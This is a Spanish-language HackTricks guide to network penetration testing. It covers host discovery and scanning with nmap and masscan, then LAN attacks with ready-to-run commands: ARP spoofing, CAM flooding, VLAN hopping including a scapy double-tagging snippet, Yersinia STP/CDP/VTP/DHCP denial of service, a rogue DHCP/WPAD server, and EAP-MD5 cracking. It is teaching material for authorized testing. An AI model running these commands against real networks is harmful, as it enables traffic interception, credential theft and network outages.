# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Descubriendo hosts desde el exterior

Esta va a ser una **sección breve** sobre cómo encontrar **IPs que responden** desde **Internet**.\
En esta situación tienes algún **scope de IPs** (quizá incluso varios **ranges**) y solo necesitas encontrar **qué IPs están respondiendo**.

### ICMP

Esta es la forma más **fácil** y **rápida** de descubrir si un host está up o no.\
Puedes intentar enviar algunos paquetes **ICMP** y **esperar respuestas**. La forma más sencilla es simplemente enviar una **echo request** y esperar la respuesta. Puedes hacer eso usando un simple `ping`or usando `fping`for **ranges**.\
También puedes usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitará filtros aplicados al típico ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de puertos TCP

Es muy común encontrar que todo tipo de ICMP packets están siendo filtrados. Entonces, lo único que puedes hacer para comprobar si un host está up es **intentar encontrar open ports**. Cada host tiene **65535 ports**, así que, si tienes un scope "big" **cannot** probar si **each port** de cada host está abierto o no, eso tomaría demasiado tiempo.\
Entonces, lo que necesitas es un **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **ports more used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
También puedes realizar este paso con `nmap`, pero es más lento y, en cierta medida, `nmap` tiene problemas para identificar hosts up.

### HTTP Port Discovery

Esto es solo un descubrimiento de puertos TCP útil cuando quieras **enfocarte en descubrir HTTP** **services**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de puertos UDP

También puedes intentar comprobar si hay algún **puerto UDP abierto** para decidir si debes **prestar más atención** a un **host.** Como los servicios UDP normalmente **no responden** con **ningún dato** a un paquete de sondeo UDP vacío, es difícil saber si un puerto está siendo filtrado o abierto. La forma más sencilla de decidir esto es enviar un paquete relacionado con el servicio que esté en ejecución, y como no sabes qué servicio está corriendo, deberías probar los más probables según el número de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La línea de nmap propuesta antes probará los **top 1000 UDP ports** en cada host dentro del rango **/24**, pero incluso solo esto tomará **>20min**. Si necesitas **resultados más rápidos** puedes usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Esto enviará estas **UDP probes** a su **expected port** (para un rango /24 esto solo tomará 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aquí puedes encontrar una buena guía de todos los ataques Wifi bien conocidos en el momento de la redacción:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Descubrir hosts desde el interior

Si estás dentro de la red, una de las primeras cosas que querrás hacer es **descubrir otros hosts**. Dependiendo de **cuánto ruido** puedas/quieras hacer, se pueden realizar diferentes acciones:

### Pasivo

Puedes usar estas herramientas para descubrir hosts de forma pasiva dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Ten en cuenta que las técnicas comentadas en [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) también pueden **aplicarse aquí**.\
Pero, al estar en la **same network** que los otros hosts, puedes hacer **más cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP activo

Ten en cuenta que las técnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](#icmp)) también pueden **aplicarse aquí**.\
Pero, al estar en la **misma red** que los otros hosts, puedes hacer **más cosas**:

- Si haces **ping** a una **dirección de broadcast de la subred** el ping debería llegar a **cada host** y podrían **responder** a **ti**: `ping -b 10.10.5.255`
- Al hacer ping a la **dirección de broadcast de la red** podrías incluso encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
- Usa las opciones `-PE`, `-PP`, `-PM` de `nmap` para realizar descubrimiento de hosts enviando respectivamente **ICMPv4 echo**, **timestamp**, y **solicitudes de máscara de subred:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se usa para **encender** computadores mediante un **mensaje de red**. El paquete mágico usado para encender el equipo es simplemente un paquete en el que se proporciona un **MAC Dst** y luego se **repite 16 veces** dentro del mismo paquete.\
Este tipo de paquetes suelen enviarse en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si **no \[MAC]** es proporcionado, el paquete se envía al **broadcast ethernet** (y el MAC de broadcast será el que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de Hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que quieres escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

- **Abierto** puerto: _SYN --> SYN/ACK --> RST_
- **Cerrado** puerto: _SYN --> RST/ACK_
- **Filtrado** puerto: _SYN --> \[SIN RESPUESTA]_
- **Filtrado** puerto: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Hay 2 opciones para escanear un puerto UDP:

- Enviar un **UDP packet** y comprobar la respuesta _**ICMP unreachable**_ si el puerto está **closed** (en varios casos ICMP estará **filtered**, por lo que no recibirás ninguna información sobre si el puerto está **closed** u **open**).
- Enviar **formatted datagrams** para provocar una respuesta de un **service** (p. ej., DNS, DHCP, TFTP y otros, como se lista en _nmap-payloads_). Si recibes una **response**, entonces el puerto está **open**.

**Nmap** will **mix both** options using "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son más lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Escaneo SCTP

**SCTP (Stream Control Transmission Protocol)** está diseñado para usarse junto con **TCP (Transmission Control Protocol)** y **UDP (User Datagram Protocol)**. Su propósito principal es facilitar el transporte de datos de telefonía sobre redes IP, replicando muchas de las funciones de fiabilidad presentes en **Signaling System 7 (SS7)**. **SCTP** es un componente central de la familia de protocolos **SIGTRAN**, que tiene como objetivo transportar señales SS7 sobre redes IP.

El soporte para **SCTP** es proporcionado por varios sistemas operativos, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, y **VxWorks**, lo que indica su amplia aceptación y utilidad en el campo de las telecomunicaciones y redes.

nmap ofrece dos escaneos diferentes para SCTP: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasión de IDS e IPS


{{#ref}}
ids-evasion.md
{{#endref}}

### **Más opciones de nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revelando direcciones IP internas

**Routers, firewalls y dispositivos de red mal configurados** a veces responden a sondas de red usando **direcciones de origen no públicas**. **tcpdump** puede utilizarse para identificar paquetes recibidos desde direcciones privadas durante las pruebas. Específicamente, en **Kali Linux**, se pueden capturar paquetes en la **eth2 interface**, la cual es accesible desde el **public Internet**. Es importante notar que si tu configuración está detrás de un **NAT** o un **Firewall**, es probable que dichos paquetes sean filtrados.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Con Sniffing puedes obtener detalles de IP ranges, subnet sizes, MAC addresses y hostnames revisando frames y packets capturados. Si la red está mal configurada o el switching fabric está bajo estrés, los atacantes pueden capturar material sensible vía passive network sniffing.

Si un switched Ethernet network está configurado correctamente, solo verás broadcast frames y material destinado a tu MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
También se pueden capturar paquetes desde una máquina remota a través de una sesión SSH con Wireshark como GUI en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Captura de credenciales

Puedes usar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar credenciales desde un pcap o desde una interfaz en vivo.

## LAN attacks

### ARP spoofing

ARP Spoofing consiste en enviar ARPResponses gratuitas para indicar que la IP de una máquina tiene la MAC de nuestro dispositivo. Entonces, la víctima cambiará la tabla ARP y contactará a nuestra máquina cada vez que quiera comunicarse con la IP suplantada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Desbordar la CAM table del switch enviando muchos paquetes con diferentes direcciones MAC de origen. Cuando la CAM table está llena, el switch empieza a comportarse como un hub (transmitiendo todo el tráfico).
```bash
macof -i <interface>
```
En switches modernos esta vulnerabilidad ha sido corregida.

### 802.1Q VLAN / DTP Ataques

#### Dynamic Trunking

El **Dynamic Trunking Protocol (DTP)** está diseñado como un protocolo de capa de enlace para facilitar un sistema automático de trunking, permitiendo que los switches seleccionen automáticamente puertos para modo trunk (Trunk) o modo no-trunk. El despliegue de **DTP** suele verse como indicativo de un diseño de red subóptimo, subrayando la importancia de configurar los trunks manualmente sólo donde sea necesario y de mantener una documentación adecuada.

Por defecto, los puertos del switch están configurados para operar en Dynamic Auto mode, lo que significa que están listos para iniciar trunking si son solicitados por un switch vecino. Surge una preocupación de seguridad cuando un pentester o atacante se conecta al switch y envía un DTP Desirable frame, forzando al puerto a entrar en trunk mode. Esta acción permite al atacante enumerar VLANs mediante análisis de frames STP y eludir la segmentación de VLANs creando interfaces virtuales.

La presencia de DTP en muchos switches por defecto puede ser explotada por adversarios para imitar el comportamiento de un switch, ganando así acceso al tráfico de todas las VLANs. El script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se utiliza para monitorizar una interfaz, revelando si un switch está en Default, Trunk, Dynamic, Auto o Access mode —siendo este último la única configuración inmune a los VLAN hopping attacks. Esta herramienta evalúa el estado de vulnerabilidad del switch.

Si se identifica una vulnerabilidad en la red, la herramienta _**Yersinia**_ puede emplearse para "enable trunking" vía el protocolo DTP, permitiendo la observación de paquetes de todas las VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Para enumerar las VLANs también es posible generar el frame DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**o interrumpas el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales trunk creados dinámicamente en el switch solo duran cinco minutos. Tras cinco minutos, el trunk se cae.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Quisiera señalar que **Access/Desirable (0x03)** indica que el frame DTP es del tipo Desirable, lo que ordena al puerto que cambie a Trunk mode. Y **802.1Q/802.1Q (0xa5** indica el tipo de encapsulación **802.1Q**.

Al analizar los frames STP, **aprendemos sobre la existencia de VLAN 30 y VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Una vez que conozcas los VLAN IDs y los valores IP, puedes **configurar una interfaz virtual para atacar una VLAN específica**.\
Si DHCP no está disponible, entonces usa _ifconfig_ para establecer una dirección IP estática.

<details>
<summary>Configuración de interfaz VLAN (ejemplo)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

El ataque discutido de **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** en otras VLANs se realiza **automáticamente** mediante la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Si un atacante conoce el valor de la **MAC, IP and VLAN ID of the victim host**, podría intentar **double tag a frame** con su VLAN designada y la VLAN de la víctima y enviar un paquete. Dado que la **victim won't be able to connect back** con el atacante, la **best option for the attacker is communicate via UDP** es comunicarse con protocolos que pueden realizar acciones interesantes (como SNMP).

Otra opción para el atacante es lanzar un **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probablemente a través de internet). Luego, el atacante podría sniff en el segundo host que controla si recibe algunos paquetes de la víctima.

![](<../../images/image (190).png>)

Para realizar este ataque puedes usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que estás conectado directamente**, tienes la capacidad de **bypass VLAN segmentation** dentro de la red. Simplemente **cambia el puerto a trunk mode** (también conocido como trunk), crea interfaces virtuales con los IDs de las VLAN objetivo y configura una dirección IP. Puedes intentar solicitar la dirección de forma dinámica (DHCP) o configurarla estáticamente. Depende del caso.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

En ciertos entornos, como redes inalámbricas para invitados, se implementan ajustes de port isolation (también conocidos como private VLAN) para evitar que los clientes conectados a un access point se comuniquen directamente entre sí. Sin embargo, se ha identificado una técnica que puede sortear estas medidas de aislamiento. Esta técnica explota la falta de ACLs de red o su configuración incorrecta, permitiendo que paquetes IP sean enrutados a través de un router para alcanzar a otro cliente en la misma red.

El ataque se ejecuta creando un packet que lleva la dirección IP del cliente destino pero con la MAC address del router. Esto provoca que el router reenvíe por error el paquete al cliente objetivo. Este enfoque es similar al utilizado en Double Tagging Attacks, donde la capacidad de controlar un host accesible para la víctima se usa para explotar la vulnerabilidad.

**Pasos clave del ataque:**

1. **Creación del packet:** Se crea especialmente un packet que incluye la dirección IP del cliente objetivo pero con la MAC address del router.
2. **Explotación del comportamiento del router:** El packet creado se envía al router, que, debido a la configuración, redirige el paquete al cliente objetivo, eludiendo el aislamiento proporcionado por las private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centraliza la gestión de VLAN. Utiliza números de revisión para mantener la integridad de la base de datos de VLAN; cualquier modificación incrementa este número. Los switches adoptan configuraciones con números de revisión más altos, actualizando sus propias bases de datos de VLAN.

#### VTP Domain Roles

- **VTP Server:** Gestiona las VLAN—crea, elimina y modifica. Emite anuncios VTP a los miembros del dominio.
- **VTP Client:** Recibe anuncios VTP para sincronizar su base de datos de VLAN. Este rol tiene restringida la modificación local de la configuración de VLAN.
- **VTP Transparent:** No participa en actualizaciones VTP pero reenvía los anuncios VTP. No se ve afectado por ataques VTP y mantiene un número de revisión constante de cero.

#### VTP Advertisement Types

- **Summary Advertisement:** Transmitido por el VTP server cada 300 segundos, contiene información esencial del dominio.
- **Subset Advertisement:** Enviado tras cambios en la configuración de VLAN.
- **Advertisement Request:** Emitido por un VTP client para solicitar un Summary Advertisement, típicamente en respuesta a detectar un número de revisión de configuración mayor.

Las vulnerabilidades de VTP son explotables exclusivamente a través de puertos trunk, ya que los anuncios VTP circulan únicamente por ellos. Tras un ataque DTP, los escenarios pueden derivar hacia VTP. Herramientas como Yersinia pueden facilitar ataques VTP, con el objetivo de borrar la VLAN database y, con ello, interrumpir la red.

Nota: Esta discusión se refiere a VTP versión 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
En el modo gráfico de Yersinia, elija la opción deleting all VTP vlans para purgar la base de datos de VLAN.

### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas éxito en un ataque STP.**

#### **STP BPDU DoS**

Al enviar muchas BPDUs TCP (Notificación de cambio de topología) o Conf (las BPDUs que se envían cuando se crea la topología), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Cuando se envía un TCP, la CAM table de los switches será borrada en 15s. Entonces, si estás enviando continuamente este tipo de packets, la CAM table se reiniciará continuamente (o cada 15segs) y cuando se reinicie, el switch se comportará como un hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

El atacante simula el comportamiento de un switch para convertirse en el STP root de la red. Entonces, más datos pasarán por él. Esto es interesante cuando estás conectado a dos switches diferentes.\
Esto se hace enviando BPDUs CONF packets que indican que el valor de **priority** es menor que la prioridad actual del switch root actual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante está conectado a 2 switches, puede ser la raíz del nuevo árbol y todo el tráfico entre esos switches pasará por él** (se realizará un MITM attack).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

CISCO Discovery Protocol (CDP) es esencial para la comunicación entre dispositivos CISCO, permitiéndoles **identificarse entre sí y compartir detalles de configuración**.

#### Recolección de datos pasiva <a href="#id-0e0f" id="id-0e0f"></a>

CDP está configurado para transmitir información por todos los puertos, lo que puede generar un riesgo de seguridad. Un atacante, al conectarse a un puerto de un switch, podría desplegar sniffers de red como **Wireshark**, **tcpdump** o **Yersinia**. Esta acción puede revelar datos sensibles sobre el dispositivo de red, incluido su modelo y la versión de Cisco IOS que ejecuta. Luego, el atacante podría apuntar a vulnerabilidades específicas en la versión de Cisco IOS identificada.

#### Inducción de inundación de la tabla CDP <a href="#id-0d6a" id="id-0d6a"></a>

Un enfoque más agresivo consiste en lanzar un Denial of Service (DoS) al sobrecargar la memoria del switch, haciéndose pasar por dispositivos CISCO legítimos. A continuación se muestra la secuencia de comandos para iniciar dicho ataque usando Yersinia, una herramienta de red diseñada para pruebas:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, la CPU del switch y la tabla de vecinos CDP quedan fuertemente cargadas, lo que conduce a lo que a menudo se conoce como **“parálisis de la red”** debido al consumo excesivo de recursos.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Ataques VoIP y la herramienta VoIP Hopper

Los teléfonos VoIP, cada vez más integrados con dispositivos IoT, ofrecen funcionalidades como desbloquear puertas o controlar termostatos mediante números telefónicos especiales. Sin embargo, esta integración puede representar riesgos de seguridad.

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) está diseñada para emular un teléfono VoIP en diversos entornos (Cisco, Avaya, Nortel, Alcatel-Lucent). Descubre el ID de VLAN de la red de voz usando protocolos como CDP, DHCP, LLDP-MED y 802.1Q ARP.

**VoIP Hopper** ofrece tres modos para el Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analiza los paquetes de red para identificar el ID de VLAN.
2. **Spoof Mode** (`-c 1`): Genera paquetes personalizados que imitan a los de un dispositivo VoIP real.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Envía paquetes idénticos a los de un modelo específico de teléfono IP Cisco.

El modo preferido por rapidez es el tercero. Requiere especificar:

- La interfaz de red del atacante (`-i` parameter).
- El nombre del dispositivo VoIP que se está emulando (`-E` parameter), respetando el formato de nombres de Cisco (p. ej., SEP seguido de una dirección MAC).

En entornos corporativos, para imitar un dispositivo VoIP existente, se puede:

- Inspeccionar la etiqueta MAC del teléfono.
- Navegar por la configuración de la pantalla del teléfono para ver la información del modelo.
- Conectar el dispositivo VoIP a un portátil y observar las solicitudes CDP con Wireshark.

Un ejemplo de comando para ejecutar la herramienta en el tercer modo sería:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeración
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dos tipos de DoS** pueden realizarse contra DHCP servers. El primero consiste en **simular suficientes hosts falsos para usar todas las posibles direcciones IP**.\
Este ataque solo funcionará si puedes ver las respuestas del DHCP server y completar el protocolo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Por ejemplo, esto **no es posible en Wifi networks**.

Otra forma de realizar un DoS contra DHCP es enviar un **paquete DHCP-RELEASE usando como dirección de origen cada IP posible**. Entonces, el server pensará que todo el mundo ha dejado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma más automática de hacer esto es usar la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Puedes usar los DoS mencionados para forzar a los clientes a obtener nuevas concesiones dentro del entorno y agotar los servidores legítimos hasta que dejen de responder. Así, cuando los legítimos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Se puede configurar un servidor DHCP malicioso usando el script DHCP ubicado en `/usr/share/responder/DHCP.py`. Esto es útil para ataques de red, como capturar tráfico HTTP y credenciales, redirigiendo el tráfico a un servidor malicioso. Sin embargo, establecer un gateway malicioso es menos efectivo, ya que solo permite capturar el tráfico saliente del cliente y se pierden las respuestas del gateway real. En su lugar, se recomienda configurar un servidor DNS o WPAD malicioso para un ataque más efectivo.

A continuación están las opciones de comando para configurar el servidor DHCP malicioso:

- **Our IP Address (Gateway Advertisement)**: Usa `-i 10.0.0.100` para anunciar la IP de tu máquina como el gateway.
- **Local DNS Domain Name**: Opcionalmente, usa `-d example.org` para establecer un nombre de dominio DNS local.
- **Original Router/Gateway IP**: Usa `-r 10.0.0.1` para especificar la IP del router o gateway legítimo.
- **Primary DNS Server IP**: Usa `-p 10.0.0.100` para establecer la IP del servidor DNS malicioso que controlas.
- **Secondary DNS Server IP**: Opcionalmente, usa `-s 10.0.0.1` para establecer una IP de servidor DNS secundario.
- **Netmask of Local Network**: Usa `-n 255.255.255.0` para definir la máscara de la red local.
- **Interface for DHCP Traffic**: Usa `-I eth1` para escuchar tráfico DHCP en una interfaz de red específica.
- **WPAD Configuration Address**: Usa `-w “http://10.0.0.100/wpad.dat”` para establecer la dirección de configuración WPAD, lo que ayuda en la interceptación del tráfico web.
- **Spoof Default Gateway IP**: Incluye `-S` para suplantar la IP del gateway por defecto.
- **Respond to All DHCP Requests**: Incluye `-R` para hacer que el servidor responda a todas las solicitudes DHCP; ten en cuenta que esto es ruidoso y puede ser detectado.

Usando correctamente estas opciones, se puede establecer un servidor DHCP malicioso para interceptar tráfico de red de manera efectiva.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Here are some of the attack tactics that can be used against 802.1X implementations:

- Brute-force activo de password a través de EAP
- Atacando el servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
- Captura de mensajes EAP y cracking offline de password (EAP-MD5 and PEAP)
- Forzar la autenticación EAP-MD5 para evitar la validación de certificados TLS
- Inyectar tráfico de red malicioso al autenticarse usando un hub o similar

Si el atacante está entre la víctima y el servidor de autenticación, podría intentar degradar (si es necesario) el protocolo de autenticación a EAP-MD5 y capturar el intento de autenticación. Luego, podría brute-force esto usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Ataques <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) es una clase de protocolos de red diseñados para **crear un sistema de enrutamiento redundante activo**. Con FHRP, routers físicos pueden combinarse en un único dispositivo lógico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Se conocen tres versiones de Routing Information Protocol (RIP): RIP, RIPv2 y RIPng. RIP y RIPv2 envían datagramas a los pares a través del puerto 520 usando UDP, mientras que RIPng transmite datagramas al puerto UDP 521 mediante multicast IPv6. RIPv2 introdujo soporte para autenticación MD5. Por otro lado, RIPng no incorpora autenticación nativa; en su lugar se basa en los encabezados opcionales IPsec AH y ESP en IPv6.

- **RIP and RIPv2:** La comunicación se realiza mediante datagramas UDP en el puerto 520.
